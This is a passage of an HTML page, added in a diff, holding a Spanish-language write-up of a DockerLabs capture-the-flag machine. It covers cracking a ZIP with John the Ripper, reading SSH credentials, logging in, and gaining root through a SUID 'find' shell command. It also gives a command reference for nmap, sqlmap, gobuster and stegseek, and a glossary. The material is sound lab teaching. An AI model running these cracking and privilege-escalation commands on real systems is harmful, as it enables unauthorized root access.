+      <div class="cmd-block" data-cmd="john --show hash_mirabien.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">JOHN · SHOW</span>
+        <div><span class="prompt">$ </span><span class="cmd">john <span class="flag">--show</span> <span class="arg">hash_mirabien.txt</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>miramebien.jpg.out/secret.txt:<span class="o-red">stupid1</span>:secret.txt:miramebien.jpg.out::miramebien.jpg.out</div>
+        <div>&nbsp;</div>
+        <div><span class="o-green">1 password hash cracked, 0 left</span></div>
+      </div>
+
+      <div class="cred-box">
+        <div class="cred-item"><div class="cred-label">CONTRASEÑA ZIP</div><div class="cred-val">stupid1</div></div>
+        <div class="cred-item"><div class="cred-label">ARCHIVO ZIP</div><div class="cred-val">miramebien.jpg.out</div></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">17</div>
+        <span class="step-title">UNZIP — EXTRAER SECRET.TXT</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con la contraseña obtenida se descomprime el archivo ZIP. Al ejecutar
+          <span class="hl-cyan">unzip miramebien.jpg.out</span>, el sistema solicita la
+          contraseña del archivo interno <span class="hl">secret.txt</span>. Se introduce
+          <span class="hl-red">stupid1</span> y se extrae el fichero de texto plano.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="unzip miramebien.jpg.out">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">UNZIP</span>
+        <div><span class="prompt">$ </span><span class="cmd">unzip <span class="arg">miramebien.jpg.out</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Archive:  miramebien.jpg.out</div>
+        <div>[miramebien.jpg.out] secret.txt password: <span class="o-red">stupid1</span></div>
+        <div>  extracting: <span class="o-green">secret.txt</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">18</div>
+        <span class="step-title">CAT SECRET.TXT — CREDENCIALES SSH</span>
+      </div>
+      <div class="prose">
+        <p>
+          El archivo <span class="hl-cyan">secret.txt</span> contiene una sola línea en
+          formato <span class="hl">usuario:contraseña</span>. Esta es exactamente la
+          estructura que se usa para credenciales SSH. El usuario es
+          <span class="hl-red">carlos</span> con la contraseña
+          <span class="hl-red">carlitos</span>. Ya tenemos todo lo que necesitamos para
+          entrar a la máquina por SSH.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="cat secret.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">CAT</span>
+        <div><span class="prompt">$ </span><span class="cmd">cat <span class="arg">secret.txt</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">carlos</span>:<span class="o-red">carlitos</span></div>
+      </div>
+
+      <div class="cred-box">
+        <div class="cred-item"><div class="cred-label">USUARIO SSH</div><div class="cred-val">carlos</div></div>
+        <div class="cred-item"><div class="cred-label">CONTRASEÑA SSH</div><div class="cred-val">carlitos</div></div>
+        <div class="cred-item"><div class="cred-label">PUERTO SSH</div><div class="cred-val">22</div></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ACCESO SSH -->
+    <div class="section" id="acceso">
+      <p class="section-label">// 08</p>
+      <h2 class="section-title">Acceso Inicial — SSH como carlos</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">19</div>
+        <span class="step-title">CONEXIÓN SSH CON LAS CREDENCIALES OBTENIDAS</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con las credenciales extraídas de <em>secret.txt</em>, se establece una conexión
+          SSH al servidor. El comando <span class="hl-cyan">ssh carlos@172.17.0.2</span>
+          inicia el cliente SSH indicando que queremos conectarnos con el usuario
+          <span class="hl">carlos</span> a la IP del contenedor. La primera vez que
+          nos conectamos a un host desconocido, SSH pide confirmación para guardar la
+          <strong>fingerprint</strong> del servidor en <span class="hl-cyan">~/.ssh/known_hosts</span>
+          — respondemos <em>yes</em>. Después solicitará la contraseña.
+        </p>
+        <p>
+          La conexión es exitosa. La shell muestra el banner de Debian y el prompt de
+          <span class="hl">carlos</span>. Estamos dentro del sistema con una terminal
+          interactiva completa — mucho más cómoda que la webshell con la que trabajamos en
+          la máquina Overlay. Desde aquí comenzamos la fase de escalada de privilegios.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="ssh carlos@172.17.0.2">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SSH</span>
+        <div><span class="prompt">$ </span><span class="cmd">ssh <span class="arg">carlos</span>@<span class="arg">172.17.0.2</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>carlos@172.17.0.2's password: <span class="o-red">carlitos</span></div>
+        <div>&nbsp;</div>
+        <div>Linux 7f7f6af51336 6.18.12+kali-amd64 #1 SMP PREEMPT_DYNAMIC (2026-02-25) x86_64</div>
+        <div>&nbsp;</div>
+        <div>The programs included with the Debian GNU/Linux system are free software;</div>
+        <div>the exact distribution terms for each program are described in the</div>
+        <div>individual files in /usr/share/doc/*/copyright.</div>
+        <div>&nbsp;</div>
+        <div>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</div>
+        <div>permitted by applicable law.</div>
+        <div>Last login: Sat Aug 10 19:44:14 2024 from 172.17.0.1</div>
+        <div><span class="o-green">carlos@7f7f6af51336:~$</span></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- PRIVESC -->
+    <div class="section" id="privesc">
+      <p class="section-label">// 09</p>
+      <h2 class="section-title">Escalada de Privilegios — SUID en /usr/bin/find</h2>
+      <div class="section-line"></div>
+
+      <div class="prose">
+        <p>
+          Dentro del sistema como <span class="hl">carlos</span>, necesitamos encontrar
+          una vía para escalar a <span class="hl-red">root</span>. La metodología estándar
+          de reconocimiento local comienza buscando binarios con el bit
+          <strong>SUID</strong> activado, ya que son ejecutables que corren con los permisos
+          de su propietario (normalmente root) independientemente de quién los ejecute.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">20</div>
+        <span class="step-title">BÚSQUEDA DE BINARIOS SUID</span>
+      </div>
+      <div class="prose">
+        <p>
+          El comando <span class="hl-cyan">find / -perm -4000 2&gt;/dev/null</span> busca
+          recursivamente desde la raíz del sistema de archivos (<span class="hl-cyan">/</span>)
+          todos los archivos que tengan el bit <strong>SUID (4000)</strong> activado en sus
+          permisos. El guion antes del número (<span class="hl-cyan">-4000</span>) significa
+          "que tenga al menos este bit activado". El <span class="hl-cyan">2&gt;/dev/null</span>
+          descarta todos los mensajes de error (como "Permission denied" al intentar acceder
+          a directorios de root) para que la salida sea limpia y solo muestre los binarios
+          encontrados.
+        </p>
+        <p>
+          Entre los resultados aparece <span class="hl-red">/usr/bin/find</span> — la
+          herramienta de búsqueda de archivos de Unix. El hecho de que <em>find</em>
+          tenga SUID es un error de configuración grave: <em>find</em> tiene la capacidad
+          de ejecutar comandos arbitrarios mediante su flag <span class="hl-cyan">-exec</span>,
+          por lo que si corre como root, puede ejecutar cualquier cosa como root.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="find / -perm -4000 2>/dev/null">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SUID SEARCH</span>
+        <div><span class="prompt">$ </span><span class="cmd">find <span class="arg">/</span> <span class="flag">-perm -4000</span> <span class="arg">2&gt;/dev/null</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>/usr/lib/dbus-1.0/dbus-daemon-launch-helper</div>
+        <div>/usr/lib/mysql/plugin/auth_pam_tool_dir/auth_pam_tool</div>
+        <div>/usr/lib/openssh/ssh-keysign</div>
+        <div>/usr/bin/su</div>
+        <div>/usr/bin/chfn</div>
+        <div>/usr/bin/newgrp</div>
+        <div class="o-red">/usr/bin/find</div>
+        <div>/usr/bin/mount</div>
+        <div>/usr/bin/umount</div>
+        <div>/usr/bin/passwd</div>
+        <div>/usr/bin/gpasswd</div>
+        <div>/usr/bin/chsh</div>
+        <div>/usr/bin/sudo</div>
+      </div>
+
+      <div class="warn-box">
+        <p class="warn-box-title">// ¿POR QUÉ /usr/bin/find CON SUID ES PELIGROSO?</p>
+        <p>El binario <strong>find</strong> tiene la capacidad <code>-exec</code> que permite ejecutar cualquier comando arbitrario por cada archivo encontrado. Si find tiene el bit SUID activado y su propietario es root, todos esos comandos se ejecutan con permisos de superusuario. Esto es exactamente lo que explotaremos. Esta configuración nunca debería existir en un sistema real — find solo necesita SUID en circunstancias muy excepcionales.</p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">21</div>
+        <span class="step-title">INVESTIGACIÓN EN GTFOBINS</span>
+      </div>
+      <div class="prose">
+        <p>
+          <strong>GTFOBins</strong> (gtfobins.github.io) es un repositorio curado de técnicas
+          para abusar binarios Unix con privilegios elevados (SUID, sudo, capabilities).
+          Al buscar <em>"find"</em> en GTFOBins bajo la categoría SUID, encontramos exactamente
+          el payload que necesitamos: el binario puede usarse para obtener una shell interactiva
+          (<span class="hl-cyan">/bin/sh</span>) a través de su flag <span class="hl-cyan">-exec</span>,
+          y el flag <span class="hl-cyan">-p</span> de sh es clave — sin él, algunos sistemas
+          modernos eliminarían los privilegios SUID al iniciar la shell (mecanismo de
+          seguridad). Con <span class="hl-cyan">-p</span>, la shell mantiene el UID efectivo
+          del proceso (root).
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">22</div>
+        <span class="step-title">EXPLOTACIÓN SUID — SHELL COMO ROOT</span>
+      </div>
+      <div class="prose">
+        <p>
+          El comando final es elegante en su simplicidad. Se ejecuta
+          <span class="hl-cyan">/usr/bin/find . -exec /bin/sh -p \; -quit</span>.
+          Desglosado: <span class="hl-cyan">find .</span> busca en el directorio actual,
+          <span class="hl-cyan">-exec /bin/sh -p \;</span> ejecuta <em>/bin/sh</em> con
+          el flag <em>-p</em> por cada archivo encontrado (en este caso, el primer archivo
+          del directorio actual), y <span class="hl-cyan">-quit</span> hace que find
+          termine inmediatamente después del primer resultado, evitando que se ejecute
+          múltiples veces. Como find corre con SUID de root, la shell que lanza también
+          hereda esos permisos. El comando <span class="hl-cyan">whoami</span> confirma:
+          <span class="hl-red">root</span>.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="/usr/bin/find . -exec /bin/sh -p \; -quit">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PRIVESC · SUID FIND</span>
+        <div><span class="prompt">$ </span><span class="cmd">/usr/bin/find <span class="flag">.</span> <span class="flag">-exec</span> <span class="arg">/bin/sh -p</span> <span class="flag">\;</span> <span class="flag">-quit</span></span></div>
+        <div><span class="prompt-root"># </span><span class="cmd">whoami</span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-red">root</span></div>
+        <div><span class="o-red">#</span> <span class="o-white">_</span></div>
+      </div>
+
+      <div class="sqli-box">
+        <p class="sqli-box-title">// MÁQUINA COMPROMETIDA COMPLETAMENTE</p>
+        <p>Hemos obtenido una shell como <strong>root</strong> en el contenedor. El flujo completo desde acceso inicial hasta privesc fue: <strong>SQLi → DB dump → wordlist → directorio oculto → esteganografía → crack ZIP → SSH → SUID find → root</strong>. Cada paso usó la información obtenida en el anterior, formando una cadena de ataque coherente.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- REFERENCIA DE COMANDOS -->
+    <div class="section" id="referencia">
+      <p class="section-label">// 10</p>
+      <h2 class="section-title">Referencia de Comandos</h2>
+      <div class="section-line"></div>
+
+      <div class="cmd-ref-grid">
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">auto_deploy.sh</div>
+          <div class="cmd-ref-syntax">sudo bash auto_deploy.sh &lt;machine.tar&gt;</div>
+          <div class="cmd-ref-desc">Script de DockerLabs que carga y lanza el contenedor vulnerable. Requiere sudo para gestionar Docker. Bloquea el terminal hasta que presionas Ctrl+C, momento en que elimina el contenedor.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>sudo</span> — Ejecuta con privilegios de superusuario (Docker lo requiere)</li>
+            <li><span>bash</span> — Interprete shell que ejecuta el script</li>
+            <li><span>mirame.tar</span> — Imagen Docker comprimida de la máquina víctima</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">nmap</div>
+          <div class="cmd-ref-syntax">nmap -p- -sSCV -n -Pn --min-rate=5000 --open &lt;IP&gt; -oX &lt;file&gt;</div>
+          <div class="cmd-ref-desc">Escáner de red y puertos. Uno de los pilares del reconocimiento en pentesting. Detecta puertos abiertos, versiones de servicios y ejecuta scripts NSE de reconocimiento automáticamente.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-p-</span> — Escanea los 65,535 puertos TCP (no solo los 1000 por defecto)</li>
+            <li><span>-sS</span> — SYN scan: no completa el handshake TCP (más sigiloso)</li>
+            <li><span>-sC</span> — Ejecuta scripts NSE por defecto (reconocimiento automático)</li>
+            <li><span>-sV</span> — Detecta versiones de servicios en cada puerto</li>
+            <li><span>-n</span> — Sin resolución DNS (más rápido)</li>
+            <li><span>-Pn</span> — Sin ping previo (asume que el host está activo)</li>
+            <li><span>--min-rate=5000</span> — Mínimo 5000 paquetes/segundo (scan agresivo)</li>
+            <li><span>--open</span> — Muestra solo puertos con estado OPEN</li>
+            <li><span>-oX file.xml</span> — Exporta resultados en formato XML</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">gobuster</div>
+          <div class="cmd-ref-syntax">gobuster dir -u &lt;URL&gt; -w &lt;wordlist&gt; -x &lt;extensiones&gt;</div>
+          <div class="cmd-ref-desc">Herramienta de fuerza bruta para descubrir directorios y archivos web. Envía peticiones HTTP para cada entrada del diccionario y reporta las que devuelven código 200 (encontrado) u otros códigos relevantes.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>dir</span> — Modo directory/file enumeration</li>
+            <li><span>-u URL</span> — URL objetivo del servidor web</li>
+            <li><span>-w wordlist</span> — Ruta al diccionario de palabras a probar</li>
+            <li><span>-x ext</span> — Extensiones a añadir a cada palabra (php, txt, bak, old)</li>
+            <li><span>-t N</span> — Número de hilos concurrentes (default: 10)</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">sqlmap</div>
+          <div class="cmd-ref-syntax">sqlmap -r &lt;request.txt&gt; [--dbs] [-D db] [--tables] [-T tabla] [--dump]</div>
+          <div class="cmd-ref-desc">Herramienta automatizada de detección y explotación de SQL Injection. Prueba múltiples técnicas (boolean-based, error-based, time-based, union-based) y puede extraer toda la estructura y datos de la base de datos.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-r request.txt</span> — Lee el request HTTP desde un archivo (capturado con Burp)</li>
+            <li><span>--dbs</span> — Enumera todas las bases de datos disponibles</li>
+            <li><span>-D nombre</span> — Selecciona una base de datos específica para operar</li>
+            <li><span>--tables</span> — Lista todas las tablas de la base de datos seleccionada</li>
+            <li><span>-T nombre</span> — Selecciona una tabla específica</li>
+            <li><span>--dump</span> — Extrae y muestra todos los datos de la tabla seleccionada</li>
+            <li><span>--batch</span> — Responde automáticamente a todas las preguntas interactivas</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">stegseek</div>
+          <div class="cmd-ref-syntax">stegseek &lt;imagen.jpg&gt; [wordlist]</div>
+          <div class="cmd-ref-desc">Herramienta de ataque de diccionario contra datos ocultos con steghide en imágenes JPEG. Prueba miles de passphrases por segundo hasta encontrar la correcta y extrae automáticamente el archivo embebido.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>imagen.jpg</span> — Imagen JPEG a analizar en busca de datos esteganográficos</li>
+            <li><span>wordlist</span> — Diccionario de passphrases (opcional; usa lista interna por defecto)</li>
+            <li><span>-o archivo</span> — Especifica el nombre del archivo de salida extraído</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">zip2john / john</div>
+          <div class="cmd-ref-syntax">zip2john &lt;archivo.zip&gt; &gt; hash.txt &amp;&amp; john --wordlist=rockyou.txt hash.txt</div>
+          <div class="cmd-ref-desc">Flujo de crackeo de ZIPs cifrados: zip2john extrae el hash del archivo ZIP en un formato que John the Ripper puede procesar. John luego prueba palabras del diccionario hasta encontrar la contraseña.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>zip2john archivo</span> — Convierte el ZIP protegido a formato de hash crackeable</li>
+            <li><span>--wordlist=</span> — Especifica el diccionario para el ataque (rockyou.txt)</li>
+            <li><span>--show</span> — Muestra las contraseñas ya crackeadas para los hashes del archivo</li>
+            <li><span>--format=</span> — Fuerza un formato de hash específico (ej: pkzip)</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">ssh</div>
+          <div class="cmd-ref-syntax">ssh &lt;usuario&gt;@&lt;IP&gt;</div>
+          <div class="cmd-ref-desc">Secure Shell: protocolo criptográfico para acceso remoto seguro a servidores. Establece un túnel cifrado donde todos los comandos y respuestas viajan encriptados, a diferencia de telnet.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>usuario@IP</span> — Usuario del sistema remoto y su dirección IP</li>
+            <li><span>-p puerto</span> — Puerto SSH si no es el estándar 22</li>
+            <li><span>-i clave</span> — Usa una clave privada para autenticarse en lugar de contraseña</li>
+            <li><span>-L</span> — Port forwarding local (túnel SSH)</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">find (SUID Privesc)</div>
+          <div class="cmd-ref-syntax">/usr/bin/find . -exec /bin/sh -p \; -quit</div>
+          <div class="cmd-ref-desc">Abuso del binario find con bit SUID para escalar privilegios. Al tener SUID de root, find ejecuta el comando especificado en -exec con permisos de superusuario. Técnica documentada en GTFOBins.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>.</span> — Directorio de búsqueda (el directorio actual)</li>
+            <li><span>-exec cmd \;</span> — Ejecuta el comando por cada archivo encontrado</li>
+            <li><span>/bin/sh -p</span> — Lanza una shell manteniendo los privilegios SUID (UID efectivo)</li>
+            <li><span>-quit</span> — Termina find después del primer resultado (evita múltiples shells)</li>
+          </ul>
+        </div>
+
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- GLOSARIO -->
+    <div class="section" id="glosario">
+      <p class="section-label">// 11</p>
+      <h2 class="section-title">Glosario</h2>
+      <div class="section-line"></div>
+
+      <div class="glosario-grid">
+
+        <div class="glos-card">
+          <div class="glos-term">SQL Injection (SQLi)</div>
+          <div class="glos-def">La <strong>inyección SQL</strong> es una vulnerabilidad web que permite a un atacante interferir en las consultas que una aplicación hace a su base de datos. Ocurre cuando la aplicación construye queries SQL concatenando directamente el input del usuario sin sanitizarlo. El atacante introduce caracteres especiales como <code>'</code>, <code>--</code>, <code>;</code> o <code>OR 1=1</code> que cambian la lógica de la query original. Las consecuencias van desde bypass de autenticación hasta extracción completa de la base de datos o ejecución de comandos en el sistema operativo.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Prepared Statements — Prevención de SQLi</div>
+          <div class="glos-def">Los <strong>prepared statements</strong> (sentencias preparadas) son la contramedida principal contra SQL Injection. En lugar de construir la query concatenando strings, se define la query con parámetros placeholder (<code>?</code> o <code>:nombre</code>) y se envían los valores por separado. La base de datos los trata siempre como datos literales, nunca como código SQL, haciendo imposible que un apóstrofe en el input rompa la query. En PHP se usan con <code>mysqli_prepare()</code> o PDO.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">sqlmap — Técnicas de Inyección</div>
+          <div class="glos-def"><strong>sqlmap</strong> usa varias técnicas para extraer datos: <strong>Boolean-based blind</strong>: hace preguntas de sí/no (si la primera letra del nombre de la DB es 'a', ¿la respuesta cambia?); <strong>Error-based</strong>: extrae datos embebidos en mensajes de error del DBMS; <strong>Time-based blind</strong>: usa <code>SLEEP(N)</code> para comunicar datos mediante retardos medibles; <strong>UNION-based</strong>: añade una query secundaria con <code>UNION SELECT</code> para inyectar datos en la respuesta. La elección de técnica depende de lo que el servidor devuelva al atacante.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Gobuster — Enumeración Web</div>
+          <div class="glos-def"><strong>Gobuster</strong> es una herramienta de fuerza bruta para descubrir recursos web ocultos. Para cada palabra en el diccionario, envía una petición HTTP GET al servidor y analiza el código de respuesta: <strong>200</strong> = recurso existe y es accesible, <strong>301/302</strong> = redirección (posible directorio), <strong>403</strong> = existe pero acceso denegado, <strong>404</strong> = no existe. La combinación de un buen diccionario y extensiones de archivo (<code>-x</code>) permite descubrir archivos y directorios que no están enlazados en la web visible.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Burp Suite — Proxy de Interceptación HTTP</div>
+          <div class="glos-def"><strong>Burp Suite</strong> es la herramienta estándar del sector para pruebas de seguridad web. Actúa como un proxy intermedio entre el navegador y el servidor: todo el tráfico HTTP/HTTPS pasa a través de él. Sus principales módulos son: <strong>Proxy</strong> (intercepta y modifica requests en tiempo real), <strong>Repeater</strong> (reenvía requests modificados manualmente), <strong>Intruder</strong> (automatiza ataques de fuerza bruta sobre parámetros) y <strong>Scanner</strong> (versión Pro, detecta vulnerabilidades automáticamente). Es fundamental para capturar requests de formularios web y pasárselos a otras herramientas como sqlmap.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Esteganografía — steghide y stegseek</div>
+          <div class="glos-def">La <strong>esteganografía</strong> (del griego "escritura oculta") es el arte de esconder información dentro de otros archivos de forma imperceptible. <strong>steghide</strong> es un programa que embebe datos dentro de imágenes JPEG o BMP modificando los bits menos significativos (LSB) de los píxeles con una clave (passphrase). El cambio visual es invisible al ojo humano. <strong>stegseek</strong> es un cracker de steghide que prueba millones de passphrases por segundo usando un diccionario, automatizando lo que sería imposible manualmente. Cuando se extrae el archivo, se obtiene el contenido original oculto.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">John the Ripper — Crackeo de Hashes</div>
+          <div class="glos-def"><strong>John the Ripper</strong> es uno de los crackers de contraseñas más veteranos y versátiles. Soporta cientos de formatos de hash (MD5, SHA, bcrypt, NTLM, PKZIP, etc.). Funciona en varios modos: <strong>Wordlist attack</strong> (prueba cada palabra de un diccionario), <strong>Rules attack</strong> (aplica transformaciones a las palabras: mayúsculas, números al final, sustituciones), y <strong>Brute force</strong> (prueba todas las combinaciones posibles). El hash nunca se "descifra" — se calcula el hash de candidatos hasta encontrar uno que coincida con el hash objetivo. <code>zip2john</code> extrae el hash en formato compatible con John.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">SUID — Set User ID Bit</div>
+          <div class="glos-def">El bit <strong>SUID (Set User ID)</strong> es un permiso especial de Unix que, cuando está activado en un ejecutable, hace que el programa corra con el UID (User ID) del propietario del archivo en lugar del UID del usuario que lo ejecuta. Si un binario tiene SUID y es propiedad de root, cualquier usuario puede ejecutarlo y obtendrá permisos de root durante esa ejecución. Binarios legítimos con SUID incluyen <code>/usr/bin/passwd</code> (para que cualquier usuario pueda cambiar su propia contraseña) o <code>/usr/bin/sudo</code>. El problema surge cuando binarios que permiten ejecutar código arbitrario (como <code>find</code>, <code>python</code>, <code>vim</code>) tienen SUID — se convierten en vectores de escalada de privilegios.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">GTFOBins — Binarios Unix para Privesc</div>
+          <div class="glos-def"><strong>GTFOBins</strong> (gtfobins.github.io) es un repositorio curado y mantenido por la comunidad de ciberseguridad que documenta cómo binarios Unix estándar pueden ser abusados para: <strong>escalar privilegios</strong> (SUID/sudo), <strong>leer/escribir archivos arbitrarios</strong>, <strong>obtener shells</strong>, o <strong>exfiltrar datos</strong>. El nombre viene de "Get The F*** Out (of restricted environments)". Para cada binario, documenta los casos aplicables con el comando exacto a usar. Es la referencia definitiva para post-explotación en Linux.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Docker — Contenedores y Redes</div>
+          <div class="glos-def"><strong>Docker</strong> es una plataforma de contenedorización que permite empaquetar aplicaciones con todas sus dependencias en unidades aisladas llamadas contenedores. A diferencia de las máquinas virtuales, los contenedores comparten el kernel del host y son mucho más ligeros. Docker crea automáticamente una red bridge (<strong>docker0</strong>) con el rango <code>172.17.0.0/16</code>: el host recibe <code>172.17.0.1</code> y los contenedores se asignan secuencialmente (<code>172.17.0.2</code>, etc.). Esta arquitectura es la que usa DockerLabs para sus máquinas vulnerables.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Directory Listing de Apache</div>
+          <div class="glos-def">El <strong>directory listing</strong> (listado de directorio) ocurre cuando Apache muestra el contenido de una carpeta en lugar de un error 403, porque el directorio no contiene un archivo <code>index.html</code> o <code>index.php</code> y la opción <code>Options +Indexes</code> está habilitada (o <code>-Indexes</code> no está configurada). Esto expone todos los archivos del directorio al visitante. Es una mala configuración frecuente: en un entorno de producción nunca debería estar habilitado, ya que revela la estructura de archivos del servidor. En CTFs, a menudo es intencional como pista.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Escalada de Privilegios Local (LPE)</div>
+          <div class="glos-def">La <strong>escalada de privilegios local</strong> es el proceso por el cual un usuario con acceso limitado al sistema obtiene permisos de superusuario (root). En Linux, los vectores más comunes son: <strong>SUID mal configurados</strong> (binarios que ejecutan código arbitrario como root), <strong>sudo mal configurado</strong> (el usuario puede ejecutar ciertos comandos como root sin contraseña), <strong>cron jobs</strong> (tareas programadas que ejecutan scripts modificables por el usuario), <strong>vulnerabilidades del kernel</strong>, y <strong>credenciales mal almacenadas</strong>. En esta máquina, el vector es un binario SUID (<code>find</code>).</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">SSH — Secure Shell</div>
+          <div class="glos-def"><strong>SSH (Secure Shell)</strong> es un protocolo de red criptográfico para operar servicios de red de forma segura sobre redes no seguras. Cifra toda la comunicación mediante claves asimétricas y/o contraseñas. Funciona en el <strong>puerto 22</strong> por defecto. El proceso de autenticación puede ser: <strong>por contraseña</strong> (la contraseña viaja cifrada por el túnel SSH) o <strong>por clave pública</strong> (se genera un par de claves pública/privada; el servidor guarda la pública y el cliente demuestra que tiene la privada sin enviarla). Es el método estándar para administrar servidores Linux remotamente.</div>
+        </div>
+
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · DockerLabs</p>
+  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
+</footer>
+
+<script>
+  // ACTIVE TOC
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+  // CURSOR
+  const cursor = document.getElementById('cursor');
+  const ring   = document.getElementById('cursorRing');
+  document.addEventListener('mousemove', e => {
+    cursor.style.left = e.clientX + 'px'; cursor.style.top = e.clientY + 'px';
+    ring.style.left   = e.clientX + 'px'; ring.style.top   = e.clientY + 'px';
+    cursor.style.opacity = '1'; ring.style.opacity = '0.5';
+  });
+  document.addEventListener('mousedown', () => { cursor.style.transform = 'translate(-50%,-50%) scale(0.5)'; });
+  document.addEventListener('mouseup',   () => { cursor.style.transform = 'translate(-50%,-50%)'; });
+  document.querySelectorAll('a, button').forEach(el => {
+    el.addEventListener('mouseenter', () => { ring.style.width = '54px'; ring.style.height = '54px'; ring.style.opacity = '0.3'; });
+    el.addEventListener('mouseleave', () => { ring.style.width = '36px'; ring.style.height = '36px'; ring.style.opacity = '0.5'; });
+  });
+
+  // SCROLL REVEAL
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  // PROGRESS BAR
+  window.addEventListener('scroll', () => {
+    const winScroll = document.documentElement.scrollTop;
+    const height = document.documentElement.scrollHeight - window.innerHeight;
+    const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = scrolled + '%';
+  });
+
+  // TOAST
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) {
+      toast = document.createElement('div');
+      toast.className = 'toast';
+      document.body.appendChild(toast);
+    }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+
+  // COPY COMMAND
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK';
+      btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => {
+        btn.textContent = 'COPY';
+        btn.classList.remove('copied');
+      }, 1800);
+    }).catch(() => {
+      showToast('Error al copiar');
+    });
+  }
+</script>
+</body>
+</html>
